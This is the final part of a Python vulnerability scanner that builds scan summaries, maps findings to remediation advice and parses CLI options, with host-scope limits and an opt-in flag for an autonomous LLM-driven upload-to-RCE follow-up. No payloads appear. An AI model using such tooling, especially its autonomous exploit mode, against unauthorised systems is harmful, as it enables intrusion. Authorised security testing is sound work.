                'duration_seconds': round(duration, 1),
                'endpoints_total': len(self.endpoints),
                'endpoints_fuzzed': len(fuzzable),
                'upload_endpoints': len(uploads),
                'in_scope_hosts': sorted(self.allowed_hosts),
                'dropped_out_of_scope_hosts': sorted(self._dropped_hosts),
            },
            'vulnerability_summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium'),
                'low': sum(1 for v in self.vulnerabilities if v['severity'] == 'low'),
            },
            'test_results': self.test_results,
            'vulnerabilities': self.vulnerabilities,
            'recommendations': self._recommendations(),
        }
        return summary

    def _recommendations(self) -> List[str]:
        types = {v['type'] for v in self.vulnerabilities}
        recs = []
        if any('SQL' in t for t in types):
            recs.append('Use parameterized queries / prepared statements for all DB access')
        if any('XSS' in t or 'SSTI' in t for t in types):
            recs.append('Implement output encoding and Content-Security-Policy')
        if any('Command' in t for t in types):
            recs.append('Never pass user input to shell commands; use safe APIs')
        if any('File Upload' in t for t in types):
            recs.append('Validate file type by content (magic bytes), disable script execution in upload dirs')
        if any('Auth' in t for t in types):
            recs.append('Enforce authentication on all dynamic endpoints')
        if any('IDOR' in t for t in types):
            recs.append('Implement server-side authorization checks for all data access')
        if any('Header' in t or 'Cookie' in t or 'TRACE' in t for t in types):
            recs.append('Add HSTS, CSP, X-Content-Type-Options headers; set Secure+HttpOnly on cookies; disable TRACE')
        return recs


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="HAR-based authenticated VAPT engine")
    parser.add_argument('analysis', help="HAR analysis JSON (from har_analyzer.py)")
    parser.add_argument('output', nargs='?', help="output results JSON path")
    parser.add_argument('--allow-host', dest='allowed_hosts', action='append',
                        default=[], metavar='HOST',
                        help="authorise an additional in-scope host (repeatable). "
                             "Without this, only the HAR's first-seen target host "
                             "is in scope — third-party hosts are dropped.")
    parser.add_argument('--with-brain', dest='with_brain', action='store_true',
                        help="opt in to the autonomous brain_scanner upload->RCE "
                             "follow-up (LLM writes and EXECUTES code). Default OFF; "
                             "still hard-gated by the engagement allowlist.")
    args = parser.parse_args()

    with open(args.analysis) as f:
        analysis = json.load(f)
    engine = HARVAPTEngine(analysis, allowed_hosts=args.allowed_hosts or None,
                           enable_brain=args.with_brain)
    results = engine.run_comprehensive_scan()
    out = args.output if args.output else f"har_vapt_{int(time.time())}.json"
    with open(out, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n💾 Results: {out}")
    print(f"📊 {len(engine.vulnerabilities)} findings")


if __name__ == "__main__":
    main()
